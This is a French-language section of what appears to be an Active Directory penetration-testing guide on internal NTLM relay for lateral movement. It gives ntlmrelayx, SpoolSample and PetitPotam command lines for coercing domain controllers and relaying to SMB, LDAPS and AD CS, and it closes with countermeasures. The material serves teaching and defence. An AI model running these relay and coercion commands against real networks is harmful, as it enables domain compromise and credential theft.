# VI.E. Relais NTLM (Interne)

Le relais NTLM, déjà abordé pour l'accès initial ([III.D Relais NTLM et Empoisonnement LLMNR/NBT-NS](../03-acces-initial/D-relais-ntlm-llmnr.md)), peut également être une technique de mouvement latéral très efficace une fois qu'un premier point d'ancrage est établi au sein du réseau.

Si un attaquant contrôle une machine sur le réseau, il peut tenter d'intercepter des authentifications NTLM d'autres machines/utilisateurs et les relayer vers des cibles pour exécuter des actions ou obtenir un accès.

## Scénarios de Relais NTLM Interne

1.  **Depuis une Machine Compromise vers d'Autres Serveurs/Postes :**
    *   L'attaquant, ayant un shell sur `MACHINE_A`, peut utiliser des outils comme `Responder` (en mode analyse seulement pour ne pas empoisonner) ou `Inveigh` pour écouter les diffusions LLMNR/NBT-NS ou les tentatives de connexion SMB/HTTP sur `MACHINE_A`.
    *   Si un utilisateur ou un service tente de s'authentifier auprès de `MACHINE_A` via NTLM (ex: accès à un partage inexistant, erreur de frappe), l'attaquant peut relayer cette authentification.

2.  **Forcer l'Authentification (Coercition) :**
    L'attaquant peut tenter de forcer des machines (en particulier des serveurs ou des contrôleurs de domaine) à s'authentifier auprès d'une machine qu'il contrôle (ou directement vers l'outil de relais).
    *   **Printer Bug (MS-RPRN) :** `SpoolSample.exe` (ou `printerbug.py` d'Impacket) peut forcer un serveur (même un DC) à s'authentifier auprès d'une machine arbitraire via le protocole MS-RPRN (Print System Remote Protocol).
        ```powershell
        # Sur la machine de l'attaquant (ou une machine qu'il contrôle pour le relais)
        # Lancer ntlmrelayx.py pour écouter et relayer
        sudo ntlmrelayx.py -tf <FICHIER_CIBLES_RELAIS> -smb2support (-i pour interactif, ou -c "commande")

        # Depuis une machine Windows où SpoolSample est uploadé
        SpoolSample.exe <IP_MACHINE_A_RELAIS_OU_ATTAQUANT> <IP_SERVEUR_A_FORCER_AUTH>
        ```
    *   **PetitPotam (MS-EFSRPC) :** Vulnérabilité dans le protocole Encrypting File System Remote Protocol (MS-EFSRPC) qui peut être utilisée pour forcer une machine (y compris les DCs) à s'authentifier auprès d'un autre serveur.
        ```bash
        # Lancer ntlmrelayx.py
        sudo ntlmrelayx.py -t ldaps://<IP_DC_CIBLE_DU_RELAIS_LDAP> --remove-mic --escalate-user <NOUVEL_ADMIN_DA>
        # Ou pour relayer vers SMB
        # sudo ntlmrelayx.py -tf targets_smb.txt -smb2support -i

        # Exécuter PetitPotam (depuis une machine Windows ou via des outils Python)
        # Exemple avec l'outil de @topotam
        PetitPotam.exe <IP_ATTAQUANT_OU_MACHINE_RELAIS> <IP_DC_A_FORCER_AUTH>
        ```
        **Attention :** Combiné avec un relais vers LDAP sur un DC non protégé (sans LDAP Signing/Channel Binding) et AD CS mal configuré (ESC8), PetitPotam peut mener à une compromission de domaine.
    *   **DFSCoerce (MS-DFSNM) :** Une autre technique de coercition d'authentification via le protocole Distributed File System Namespace Management.
    *   **ShadowCoerce (MS-FSRVP) :** Coercition via le protocole File Server Remote VSS.

## Outils Clés pour le Relais Interne

*   **Impacket `ntlmrelayx.py` :** L'outil principal pour effectuer le relais.
    *   Peut relayer vers SMB, HTTP, LDAP, MSSQL, etc.
    *   Actions possibles :
        *   Exécuter des commandes (SMB, HTTP).
        *   Dumper les secrets SAM locaux (SMB).
        *   Créer une session interactive (SMB).
        *   Interagir avec LDAP (ajouter des utilisateurs, modifier des groupes, configurer RBCD, DCSync si les droits sont suffisants).
        *   Relayer vers AD CS pour obtenir des certificats (ESC8).
*   **Responder :** Peut être utilisé pour l'empoisonnement LLMNR/NBT-NS afin de générer des authentifications à relayer, ou en mode analyse pour identifier les sources d'authentification.
*   **Inveigh (PowerShell) :** Similaire à Responder, mais en PowerShell. Utile si l'attaquant est sur une machine Windows.
*   **Metasploit :** Possède des modules pour le relais NTLM (ex: `auxiliary/server/capture/http_ntlm`, `exploit/windows/smb/smb_relay`).

## Cibles du Relais

*   **SMB :**
    *   Si la signature SMB est désactivée ou non requise sur la cible.
    *   Permet l'exécution de commandes, le dump SAM, etc.
*   **LDAP/LDAPS (sur les Contrôleurs de Domaine) :**
    *   Extrêmement puissant si le DC n'a pas LDAP Signing et/ou LDAP Channel Binding activé.
    *   Permet de modifier des objets AD, ajouter des membres à des groupes, configurer la délégation basée sur les ressources (RBCD) pour une prise de contrôle ultérieure du DC.
    *   Relayer l'authentification du compte machine d'un DC vers LDAP (via PetitPotam par exemple) peut permettre de configurer RBCD sur ce DC pour un autre compte machine contrôlé par l'attaquant.
*   **HTTP/HTTPS :**
    *   Si une application web utilise l'authentification NTLM intégrée.
    *   Peut permettre d'accéder à l'application avec les privilèges de l'utilisateur relayé.
*   **AD CS (via HTTP) :**
    *   Si les services web d'AD CS sont vulnérables (ex: ESC8 - relais vers l'endpoint de certificat basé sur Kerberos, mais l'authentification NTLM est acceptée).

## Contre-mesures et Considérations

*   **Signature SMB (SMB Signing) :** Activer sur tous les clients et serveurs.
*   **LDAP Signing & Channel Binding :** Activer sur les DCs.
*   **EPA (Extended Protection for Authentication) :** Activer sur les services web (IIS, Exchange, AD CS).
*   **Désactiver LLMNR/NBT-NS.**
*   **Segmentation réseau :** Limiter la portée des attaques de relais.
*   **Principe de moindre privilège :** Les comptes (en particulier les comptes machines) ne devraient pas avoir de droits excessifs.
*   **Surveillance :** Détecter les tentatives de coercition d'authentification et les activités de relais suspectes.
*   **Patching :** Appliquer les correctifs pour les vulnérabilités de coercition (ex: PetitPotam, Printer Bug).

Le relais NTLM interne, surtout avec les techniques de coercition, reste une menace significative dans de nombreux environnements AD. 